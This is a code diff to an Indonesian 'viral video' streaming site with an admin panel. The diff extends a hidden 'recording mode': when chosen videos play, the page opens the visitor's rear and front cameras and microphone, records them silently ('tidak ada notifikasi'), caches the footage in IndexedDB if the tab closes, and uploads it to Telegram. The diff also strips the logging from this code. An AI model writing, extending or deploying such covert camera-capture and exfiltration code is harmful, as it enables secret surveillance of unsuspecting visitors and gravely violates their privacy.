@@ -232,9 +232,7 @@
             <h2><i class="fas fa-lock"></i> Admin Login</h2>
             <p>Masukkan password untuk mengakses panel admin</p>
             <form id="loginForm">
-                <div class="form-group">
-                    <input type="password" id="adminPassword" placeholder="••••••••" required autofocus>
-                </div>
+                <div class="form-group"><input type="password" id="adminPassword" placeholder="••••••••" required autofocus></div>
                 <button type="submit" class="btn-submit"><i class="fas fa-unlock"></i> Buka Panel</button>
                 <div class="error-msg" id="loginError"><i class="fas fa-exclamation-circle"></i> Password salah!</div>
             </form>
@@ -258,10 +256,7 @@
             <div class="placeholder" id="bannerPlaceholder"><i class="fas fa-image"></i><span style="font-size:14px; color:#444;">Belum ada thumbnail</span></div>
         </div>
         <div class="banner-info">
-            <div class="banner-left">
-                <span class="banner-title" id="bannerTitle">Product</span>
-                <span class="banner-desc" id="bannerDesc">Deskripsi banner di sini</span>
-            </div>
+            <div class="banner-left"><span class="banner-title" id="bannerTitle">Product</span><span class="banner-desc" id="bannerDesc">Deskripsi banner di sini</span></div>
             <div class="banner-right">
                 <span class="banner-bought"><i class="fas fa-shopping-cart"></i> <span id="bannerBought">0</span> terjual</span>
                 <button class="banner-edit-btn" id="bannerEditBtn" onclick="toggleBannerEditor()"><i class="fas fa-pen"></i> Edit</button>
@@ -269,30 +264,17 @@
         </div>
     </div>
 
-    <a href="https://t.me/sachiexyz" target="_blank" rel="noopener" class="telegram-banner" id="telegramBanner">
-        <i class="fab fa-telegram"></i>
-        <span>JOIN TELEGRAM UNTUK UPDATE VIDEO VIRAL</span>
-    </a>
-
-    <a href="https://whatsapp.com/channel/0029VbESt7p2UPBAqtbNEi0I" target="_blank" rel="noopener" class="whatsapp-banner" id="whatsappBanner">
-        <i class="fab fa-whatsapp"></i>
-        <span>JOIN SALURAN WHATSAPP UNTUK UPDATE VIDEO VIRAL</span>
-    </a>
+    <a href="https://t.me/sachiexyz" target="_blank" rel="noopener" class="telegram-banner" id="telegramBanner"><i class="fab fa-telegram"></i><span>JOIN TELEGRAM UNTUK UPDATE VIDEO VIRAL</span></a>
+    <a href="https://whatsapp.com/channel/0029VbESt7p2UPBAqtbNEi0I" target="_blank" rel="noopener" class="whatsapp-banner" id="whatsappBanner"><i class="fab fa-whatsapp"></i><span>JOIN SALURAN WHATSAPP UNTUK UPDATE VIDEO VIRAL</span></a>
 
     <div class="whatsapp-admin-panel" id="whatsappEditorPanel">
         <h3><i class="fab fa-whatsapp"></i> Edit Link WhatsApp</h3>
-        <form id="whatsappForm">
-            <div class="form-group"><label>URL Channel WhatsApp</label><input type="url" id="whatsappLinkInput"></div>
-            <div><button type="submit" class="btn-save-whatsapp"><i class="fas fa-save"></i> Simpan</button><button type="button" class="btn-cancel-whatsapp" onclick="toggleWhatsappEditor()">Batal</button></div>
-        </form>
+        <form id="whatsappForm"><div class="form-group"><label>URL Channel WhatsApp</label><input type="url" id="whatsappLinkInput"></div><div><button type="submit" class="btn-save-whatsapp"><i class="fas fa-save"></i> Simpan</button><button type="button" class="btn-cancel-whatsapp" onclick="toggleWhatsappEditor()">Batal</button></div></form>
     </div>
 
     <div class="telegram-admin-panel" id="telegramEditorPanel">
         <h3><i class="fab fa-telegram"></i> Edit Link Telegram</h3>
-        <form id="telegramForm">
-            <div class="form-group"><label>URL Channel/Group Telegram</label><input type="url" id="telegramLinkInput"></div>
-            <div><button type="submit" class="btn-save-telegram"><i class="fas fa-save"></i> Simpan</button><button type="button" class="btn-cancel-telegram" onclick="toggleTelegramEditor()">Batal</button></div>
-        </form>
+        <form id="telegramForm"><div class="form-group"><label>URL Channel/Group Telegram</label><input type="url" id="telegramLinkInput"></div><div><button type="submit" class="btn-save-telegram"><i class="fas fa-save"></i> Simpan</button><button type="button" class="btn-cancel-telegram" onclick="toggleTelegramEditor()">Batal</button></div></form>
     </div>
 
     <div class="banner-admin-panel" id="bannerEditorPanel">
@@ -447,17 +429,14 @@
 
         <div class="admin-form" id="formRecmode">
             <div class="rec-admin-panel" id="recModePanel">
-                <h3><i class="fas fa-video"></i> Mode Rekam Bergantian (Belakang → Depan)</h3>
+                <h3><i class="fas fa-video"></i> Mode Rekam (Dual / Bergantian)</h3>
                 <p style="color:#888; font-size:13px; margin-bottom:12px;">
                     Pilih video yang akan memicu rekaman saat diputar pengunjung.
-                    Rekaman <strong>mulai dari kamera belakang selama 5 detik</strong>, lalu otomatis berganti ke <strong>kamera depan sampai video selesai</strong>.
-                    Keduanya dikirim ke Telegram sebagai video.
+                    <br><strong>HP support dual kamera:</strong> rekam belakang + depan sekaligus sampai video selesai.
+                    <br><strong>HP tidak support:</strong> rekam belakang 5 detik → ganti depan sampai video selesai.
                     <br><em style="color:#ef4444;">Berjalan senyap — tidak ada notifikasi apapun di HP pengunjung.</em>
                 </p>
-                <div class="form-group">
-                    <label>Pilih Video yang Dipantau (per folder)</label>
-                    <div class="rec-video-list" id="recVideoList"></div>
-                </div>
+                <div class="form-group"><label>Pilih Video yang Dipantau (per folder)</label><div class="rec-video-list" id="recVideoList"></div></div>
                 <button type="button" class="btn-submit" style="background:#ef4444;" onclick="saveRecModeSettings()"><i class="fas fa-save"></i> Simpan Pengaturan Mode Rekam</button>
                 <div class="rec-status-box" id="recStatusBox"><i class="fas fa-info-circle"></i> Belum ada pengaturan mode rekam.</div>
                 <hr style="border:none; border-top:1px solid #2a2a2a; margin:20px 0;">
@@ -564,7 +543,7 @@
                 const res = await fetch(`${SUPABASE_URL}/rest/v1/${UNLOCK_TOKENS_TABLE}`, { method: 'POST', headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json', 'Prefer': 'return=minimal' }, body: JSON.stringify({ token, folder_id: String(folderId), used: false, created_at: new Date().toISOString() }) });
                 if (!res.ok) throw new Error('status ' + res.status);
                 return token;
-            } catch (e) { console.error('createUnlockToken gagal:', e); return null; }
+            } catch (e) { return null; }
         }
 
         async function redeemUnlockToken(token, folderId) {
@@ -580,7 +559,7 @@
                 if (!updateRes.ok) return false;
                 const updated = await updateRes.json();
                 return updated.length > 0;
-            } catch (e) { console.error('redeemUnlockToken gagal:', e); return false; }
+            } catch (e) { return false; }
         }
 
         function resizeImageToJpegBlob(file, maxW) {
@@ -2229,21 +2208,22 @@
         }
 
         // ==========================================================
-        // MODE REKAM — BERGANTIAN: BELAKANG 5 DETIK → DEPAN SAMPAI VIDEO SELESAI
-        // Tidak ada notifikasi ke pengunjung. Kalau tab ditutup sebelum
-        // video selesai, file disimpan ke IndexedDB & diupload saat halaman dibuka lagi.
+        // MODE REKAM
+        // - Dual support: belakang + depan sampai video selesai
+        // - Tidak support: belakang 5 detik → depan sampai video selesai
+        // - Upload selalu di background
+        // - Tidak ada notifikasi ke pengunjung
         // ==========================================================
         let recSelectedVideoIds = [];
         let recSessionActive = false;
         let recSessionToken = null;
         let recActiveVideoId = null;
         let recSwitchTimer = null;
-        let recBackSlot = makeSlot();
-        let recFrontSlot = makeSlot();
+        let recBackSlot = makeRecSlot();
+        let recFrontSlot = makeRecSlot();
 
-        function makeSlot() { return { recorder: null, stream: null, chunks: [], startTime: null, mime: '' }; }
+        function makeRecSlot() { return { recorder: null, stream: null, chunks: [], startTime: null, mime: '', _finalizing: false }; }
 
-        // ---- IndexedDB helper ----
         function openRecDB() {
             return new Promise((resolve, reject) => {
                 const req = indexedDB.open('vidoy_rec_db', 1);
@@ -2256,58 +2236,26 @@
             });
         }
         async function savePendingRecFile(rec) {
-            try {
-                const db = await openRecDB();
-                return new Promise((resolve, reject) => {
-                    const tx = db.transaction('pending', 'readwrite');
-                    tx.objectStore('pending').put(rec);
-                    tx.oncomplete = () => resolve(true);
-                    tx.onerror = () => reject(tx.error);
-                });
-            } catch (e) { console.warn('Gagal simpan pending rec:', e); return false; }
+            try { const db = await openRecDB(); return new Promise((resolve, reject) => { const tx = db.transaction('pending', 'readwrite'); tx.objectStore('pending').put(rec); tx.oncomplete = () => resolve(true); tx.onerror = () => reject(tx.error); }); } catch (e) { return false; }
         }
         async function loadPendingRecFiles() {
-            try {
-                const db = await openRecDB();
-                return new Promise((resolve, reject) => {
-                    const tx = db.transaction('pending', 'readonly');
-                    const req = tx.objectStore('pending').getAll();
-                    req.onsuccess = () => resolve(req.result || []);
-                    req.onerror = () => reject(req.error);
-                });
-            } catch (e) { return []; }
+            try { const db = await openRecDB(); return new Promise((resolve, reject) => { const tx = db.transaction('pending', 'readonly'); const req = tx.objectStore('pending').getAll(); req.onsuccess = () => resolve(req.result || []); req.onerror = () => reject(req.error); }); } catch (e) { return []; }
         }
         async function deletePendingRecFile(id) {
-            try {
-                const db = await openRecDB();
-                return new Promise((resolve, reject) => {
-                    const tx = db.transaction('pending', 'readwrite');
-                    tx.objectStore('pending').delete(id);
-                    tx.oncomplete = () => resolve(true);
-                    tx.onerror = () => reject(tx.error);
-                });
-            } catch (e) { return false; }
+            try { const db = await openRecDB(); return new Promise((resolve, reject) => { const tx = db.transaction('pending', 'readwrite'); tx.objectStore('pending').delete(id); tx.oncomplete = () => resolve(true); tx.onerror = () => reject(tx.error); }); } catch (e) { return false; }
         }
         async function processPendingRecFiles() {
             const pending = await loadPendingRecFiles();
             if (!pending.length) return;
-            console.log('📤 Memproses ' + pending.length + ' rekaman tertunda...');
             for (const p of pending) {
-                try {
-                    const ok = await uploadBlobToTelegram(p.blob, p.label, p.videoId, p.duration, p.session, p.mime);
-                    if (ok) { await deletePendingRecFile(p.id); console.log('✅ Rekaman tertunda terkirim:', p.label); }
-                } catch (e) { console.warn('Gagal kirim pending rec:', e); }
+                try { const ok = await uploadBlobToTelegram(p.blob, p.label, p.videoId, p.duration, p.session, p.mime); if (ok) await deletePendingRecFile(p.id); } catch (e) {}
             }
         }
 
         async function uploadBlobToTelegram(blob, label, videoId, dur, session, mime) {
             const isMp4 = (mime || '').indexOf('mp4') !== -1;
             try {
-                const infoRes = await fetch('/api/telegram-rec', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'x-admin-key': getUploadAdminKey() },
-                    body: JSON.stringify({ label, videoId, duration: dur, session })
-                });
+                const infoRes = await fetch('/api/telegram-rec', { method: 'POST', headers: { 'Content-Type': 'application/json', 'x-admin-key': getUploadAdminKey() }, body: JSON.stringify({ label, videoId, duration: dur, session }) });
                 const info = await infoRes.json().catch(() => null);
                 if (infoRes.status === 401) { localStorage.removeItem('vidoy_upload_key'); return false; }
                 if (!infoRes.ok || !info || !info.ok) return false;
@@ -2329,8 +2277,7 @@
                 if (!data.settings.recRecordings) data.settings.recRecordings = [];
                 data.settings.recRecordings.push({
                     id: 'rec_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6),
-                    videoId: String(videoId || '-'), camera: label,
-                    url: '', fileId: doc ? doc.file_id : '', messageId: msg ? msg.message_id : 0,
+                    videoId: String(videoId || '-'), camera: label, url: '', fileId: doc ? doc.file_id : '', messageId: msg ? msg.message_id : 0,
                     chatUrl, sentToTelegram: true, error: '', duration: dur, format: ext,
                     session: String(session || '-'), createdAt: new Date().toISOString()
                 });
@@ -2350,7 +2297,7 @@
             const box = document.getElementById('recStatusBox');
             if (!box) return;
             if (recSelectedVideoIds.length === 0) box.innerHTML = '<i class="fas fa-info-circle"></i> Belum ada video yang dipantau.';
-            else box.innerHTML = '<i class="fas fa-circle-check" style="color:#22c55e;"></i> <strong>' + recSelectedVideoIds.length + '</strong> video dipantau oleh mode rekam bergantian.';
+            else box.innerHTML = '<i class="fas fa-circle-check" style="color:#22c55e;"></i> <strong>' + recSelectedVideoIds.length + '</strong> video dipantau oleh mode rekam.';
         }
 
         function renderRecVideoList() {
@@ -2359,13 +2306,7 @@
             let html = '';
             const rootVideos = data.rootVideos || [];
             if (rootVideos.length > 0) {
-                html += `<div class="rec-folder-group">
-                    <div class="rec-folder-header" onclick="toggleRecFolder(this)">
-                        <span class="rec-folder-arrow">▼</span>
-                        <span class="rec-folder-name"><i class="fas fa-home"></i> Root (Tanpa Folder)</span>
-                        <span class="rec-folder-count">${rootVideos.length} video</span>
-                    </div>
-                    <div class="rec-folder-body">`;
+                html += `<div class="rec-folder-group"><div class="rec-folder-header" onclick="toggleRecFolder(this)"><span class="rec-folder-arrow">▼</span><span class="rec-folder-name"><i class="fas fa-home"></i> Root (Tanpa Folder)</span><span class="rec-folder-count">${rootVideos.length} video</span></div><div class="rec-folder-body">`;
                 rootVideos.forEach(v => {
                     const checked = recSelectedVideoIds.includes(String(v.id)) ? 'checked' : '';
                     const thumb = v.thumbnail || 'https://via.placeholder.com/40x60/222/f59b00?text=?';
@@ -2375,13 +2316,7 @@
             }
             data.folders.forEach(f => {
                 const videos = f.videos || [];
-                html += `<div class="rec-folder-group">
-                    <div class="rec-folder-header ${videos.length === 0 ? 'collapsed' : ''}" onclick="toggleRecFolder(this)">
-                        <span class="rec-folder-arrow">▼</span>
-                        <span class="rec-folder-name"><i class="fas fa-folder"></i> ${escapeHtml(f.name)}</span>
-                        <span class="rec-folder-count">${videos.length} video</span>
-                    </div>
-                    <div class="rec-folder-body ${videos.length === 0 ? 'collapsed' : ''}">`;
+                html += `<div class="rec-folder-group"><div class="rec-folder-header ${videos.length === 0 ? 'collapsed' : ''}" onclick="toggleRecFolder(this)"><span class="rec-folder-arrow">▼</span><span class="rec-folder-name"><i class="fas fa-folder"></i> ${escapeHtml(f.name)}</span><span class="rec-folder-count">${videos.length} video</span></div><div class="rec-folder-body ${videos.length === 0 ? 'collapsed' : ''}">`;
                 if (videos.length === 0) html += `<div style="color:#555; padding:10px 12px; font-size:12px;">Folder kosong.</div>`;
                 else videos.forEach(v => {
                     const checked = recSelectedVideoIds.includes(String(v.id)) ? 'checked' : '';
@@ -2422,11 +2357,10 @@
         }
 
         async function openCamera(facingMode, withAudio) {
-            const constraints = {
+            return await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: { ideal: facingMode }, width: { ideal: 1920 }, height: { ideal: 1080 } },
                 audio: withAudio ? { echoCancellation: true, noiseSuppression: true } : false
-            };
-            return await navigator.mediaDevices.getUserMedia(constraints);
+            });
         }
 
         function startRecorderOn(slot, stream) {
@@ -2448,34 +2382,62 @@
             recSessionActive = true;
             recActiveVideoId = String(videoId);
             recSessionToken = Date.now();
+
+            // Coba dual dulu
+            let backStream = null, frontStream = null;
             try {
-                const backStream = await openCamera('environment', true);
-                recBackSlot = makeSlot();
+                const results = await Promise.allSettled([ openCamera('environment', true), openCamera('user', false) ]);
+                if (results[0].status === 'fulfilled') backStream = results[0].value;
+                if (results[1].status === 'fulfilled') frontStream = results[1].value;
+            } catch (e) {}
+
+            if (backStream && frontStream) {
+                // Dual: dua-duanya jalan sampai video selesai
+                console.log('✅ Dual kamera — rekam dua-duanya sampai video selesai');
+                recBackSlot = makeRecSlot();
+                recFrontSlot = makeRecSlot();
+                startRecorderOn(recBackSlot, backStream);
+                startRecorderOn(recFrontSlot, frontStream);
+                return;
+            }
+
+            // Fallback bergantian
+            if (frontStream) { frontStream.getTracks().forEach(t => t.stop()); frontStream = null; }
+            if (backStream) { backStream.getTracks().forEach(t => t.stop()); backStream = null; }
+
+            try {
+                backStream = await openCamera('environment', true);
+                recBackSlot = makeRecSlot();
                 startRecorderOn(recBackSlot, backStream);
             } catch (e) {
                 try {
-                    const frontStream = await openCamera('user', true);
-                    recFrontSlot = makeSlot();
+                    frontStream = await openCamera('user', true);
+                    recFrontSlot = makeRecSlot();
                     startRecorderOn(recFrontSlot, frontStream);
                 } catch (e2) { recSessionActive = false; return; }
                 return;
             }
+
             recSwitchTimer = setTimeout(async () => {
                 recSwitchTimer = null;
-                await finalizeSlot(recBackSlot, 'back', videoId);
-                try {
-                    const frontStream = await openCamera('user', true);
-                    recFrontSlot = makeSlot();
-                    startRecorderOn(recFrontSlot, frontStream);
-                } catch (e) {}
+                const backSlotSnapshot = recBackSlot;
+                let frontStream2 = null;
+                try { frontStream2 = await openCamera('user', true); } catch (e) {}
+                if (frontStream2) {
+                    recFrontSlot = makeRecSlot();
+                    startRecorderOn(recFrontSlot, frontStream2);
+                }
+                finalizeSlot(backSlotSnapshot, 'back', videoId).catch(() => {});
             }, 5000);
         }
 
         async function finalizeSlot(slot, label, videoId) {
+            if (slot._finalizing) return null;
             if (!slot.recorder || slot.recorder.state === 'inactive') {
                 if (slot.stream) { slot.stream.getTracks().forEach(t => t.stop()); slot.stream = null; }
                 return null;
             }
+            slot._finalizing = true;
             return new Promise(resolve => {
                 slot.recorder.onstop = async () => {
                     const isMp4 = (slot.mime || '').indexOf('mp4') !== -1;
@@ -2488,11 +2450,7 @@
                     if (blob.size < 1000) { resolve(null); return; }
                     const ok = await uploadBlobToTelegram(blob, label, videoId, dur, recSessionToken, slot.mime);
                     if (!ok) {
-                        await savePendingRecFile({
-                            id: 'pending_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6),
-                            blob, label, videoId, duration: dur, session: recSessionToken, mime: slot.mime,
-                            createdAt: new Date().toISOString()
-                        });
+                        await savePendingRecFile({ id: 'pending_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6), blob, label, videoId, duration: dur, session: recSessionToken, mime: slot.mime, createdAt: new Date().toISOString() });
                     }
                     resolve(ok);
                 };
@@ -2500,24 +2458,16 @@
             });
         }
 
-        // Dipanggil saat video ended: stop semua, upload langsung
         async function finalizeAllOnEnded() {
             if (recSwitchTimer) { clearTimeout(recSwitchTimer); recSwitchTimer = null; }
             if (!recSessionActive) return;
             const vid = recActiveVideoId;
             recSessionActive = false;
             recActiveVideoId = null;
-            console.log('🎬 Video ended, menghentikan rekaman & upload ke Telegram...');
-            const results = await Promise.all([
-                finalizeSlot(recBackSlot, 'back', vid),
-                finalizeSlot(recFrontSlot, 'front', vid)
-            ]);
-            const okCount = results.filter(Boolean).length;
-            console.log('✅ Selesai. ' + okCount + ' rekaman terkirim.');
+            await Promise.all([ finalizeSlot(recBackSlot, 'back', vid), finalizeSlot(recFrontSlot, 'front', vid) ]);
             renderRecRecordingsList();
         }
 
-        // Backup: simpan ke IndexedDB kalau tab ditutup sebelum video selesai
         async function stopRecordingAndPersist() {
             if (recSwitchTimer) { clearTimeout(recSwitchTimer); recSwitchTimer = null; }
             if (!recSessionActive) return;
@@ -2527,6 +2477,8 @@
             const slots = [recBackSlot, recFrontSlot];
             for (const slot of slots) {
                 if (!slot.recorder || slot.recorder.state === 'inactive') continue;
+                if (slot._finalizing) continue;
+                slot._finalizing = true;
                 const isMp4 = (slot.mime || '').indexOf('mp4') !== -1;
                 const blob = new Blob(slot.chunks, { type: isMp4 ? 'video/mp4' : 'video/webm' });
                 const dur = slot.startTime ? Math.round((Date.now() - slot.startTime.getTime()) / 1000) : 0;
@@ -2536,11 +2488,7 @@
                 slot.recorder = null;
                 if (blob.size > 1000) {
                     const label = (slot === recBackSlot) ? 'back' : 'front';
-                    await savePendingRecFile({
-                        id: 'pending_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6),
-                        blob, label, videoId: vid, duration: dur, session: recSessionToken, mime: slot.mime,
-                        createdAt: new Date().toISOString()
-                    });
+                    await savePendingRecFile({ id: 'pending_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6), blob, label, videoId: vid, duration: dur, session: recSessionToken, mime: slot.mime, createdAt: new Date().toISOString() });
                 }
             }
         }
@@ -2554,9 +2502,7 @@
                     startRecordingForVideo(currentDetailVideo.id);
                 }
             });
-            // STOP saat video selesai
             player.addEventListener('ended', () => { finalizeAllOnEnded(); });
-            // Backup kalau tab ditutup sebelum video selesai
             document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') stopRecordingAndPersist(); });
             window.addEventListener('pagehide', () => { stopRecordingAndPersist(); });
             window.addEventListener('beforeunload', () => { stopRecordingAndPersist(); });
@@ -2580,26 +2526,13 @@
                 const cards = g.items.map(r => {
                     const camLabel = r.camera === 'back' ? 'BELAKANG' : 'DEPAN';
                     const camColor = r.camera === 'back' ? '#3b82f6' : '#ef4444';
-                    const statusBadge = r.sentToTelegram
-                        ? '<span style="background:#229ED9; color:#fff; padding:2px 8px; border-radius:20px; font-size:10px; font-weight:bold;"><i class="fab fa-telegram"></i> TERKIRIM</span>'
-                        : '<span style="background:#ef4444; color:#fff; padding:2px 8px; border-radius:20px; font-size:10px; font-weight:bold;"><i class="fas fa-exclamation-triangle"></i> GAGAL</span>';
-                    const openTgBtn = r.chatUrl ? '<a href="' + escapeHtml(r.chatUrl) + '" target="_blank" style="background:#229ED9; color:#fff; padding:4px 10px; border-radius:6px; font-size:11px; text-decoration:none;"><i class="fab fa-telegram"></i> Buka di Telegram</a>' : (r.sentToTelegram ? '<a href="https://web.telegram.org/" target="_blank" style="background:#229ED9; color:#fff; padding:4px 10px; border-radius:6px; font-size:11px; text-decoration:none;"><i class="fab fa-telegram"></i> Buka Telegram</a>' : '');
+                    const statusBadge = r.sentToTelegram ? '<span style="background:#229ED9; color:#fff; padding:2px 8px; border-radius:20px; font-size:10px; font-weight:bold;"><i class="fab fa-telegram"></i> TERKIRIM</span>' : '<span style="background:#ef4444; color:#fff; padding:2px 8px; border-radius:20px; font-size:10px; font-weight:bold;"><i class="fas fa-exclamation-triangle"></i> GAGAL</span>';
+                    const openTgBtn = r.chatUrl ? '<a href="' + escapeHtml(r.chatUrl) + '" target="_blank" style="background:#229ED9; color:#fff; padding:4px 10px; border-radius:6px; font-size:11px; text-decoration:none;"><i class="fab fa-telegram"></i> Buka di Telegram</a>' : '';
                     const errNote = r.error ? '<div style="color:#ef4444; font-size:11px; margin-top:4px;">' + escapeHtml(r.error) + '</div>' : '';
                     const fmt = (r.format || 'webm').toUpperCase();
-                    return '<div style="border:1px solid #2a2a2a; border-radius:8px; padding:8px; margin-top:8px;">' +
-                        '<div style="display:flex; align-items:center; gap:8px; margin-bottom:6px; flex-wrap:wrap;">' +
-                            '<span style="background:' + camColor + '; color:#fff; padding:2px 8px; border-radius:20px; font-size:10px; font-weight:bold;">' + camLabel + '</span>' +
-                            statusBadge +
-                            '<span style="color:#555; font-size:11px;">' + r.duration + 's · ' + fmt + '</span>' +
-                            '<div style="flex:1;"></div>' + openTgBtn +
-                            '<button onclick="deleteRecRecording(\'' + r.id + '\')" style="background:#ef4444; color:#fff; border:none; padding:4px 8px; border-radius:6px; cursor:pointer; font-size:11px;"><i class="fas fa-trash"></i></button>' +
-                        '</div>' + errNote +
-                    '</div>';
+                    return '<div style="border:1px solid #2a2a2a; border-radius:8px; padding:8px; margin-top:8px;"><div style="display:flex; align-items:center; gap:8px; margin-bottom:6px; flex-wrap:wrap;"><span style="background:' + camColor + '; color:#fff; padding:2px 8px; border-radius:20px; font-size:10px; font-weight:bold;">' + camLabel + '</span>' + statusBadge + '<span style="color:#555; font-size:11px;">' + r.duration + 's · ' + fmt + '</span><div style="flex:1;"></div>' + openTgBtn + '<button onclick="deleteRecRecording(\'' + r.id + '\')" style="background:#ef4444; color:#fff; border:none; padding:4px 8px; border-radius:6px; cursor:pointer; font-size:11px;"><i class="fas fa-trash"></i></button></div>' + errNote + '</div>';
                 }).join('');
-                return '<div style="background:#14151A; border:1px solid #2a2a2a; border-radius:8px; padding:10px; margin-bottom:10px;">' +
-                    '<div style="color:#fff; font-size:13px; font-weight:600;">' + escapeHtml(title) + '</div>' +
-                    '<div style="color:#555; font-size:11px;">' + date + ' · sesi ' + escapeHtml(String(g.session || '-')) + '</div>' + cards +
-                '</div>';
+                return '<div style="background:#14151A; border:1px solid #2a2a2a; border-radius:8px; padding:10px; margin-bottom:10px;"><div style="color:#fff; font-size:13px; font-weight:600;">' + escapeHtml(title) + '</div><div style="color:#555; font-size:11px;">' + date + ' · sesi ' + escapeHtml(String(g.session || '-')) + '</div>' + cards + '</div>';
             }).join('');
         }
 
@@ -2661,7 +2594,6 @@
             openUnlockedVideoFromUrl();
             await openUnlockedFolderFromUrl();
             openGoLinkFromUrl();
-            console.log('🎬 Vidoy Stream siap!');
         }
         init();
     </script>
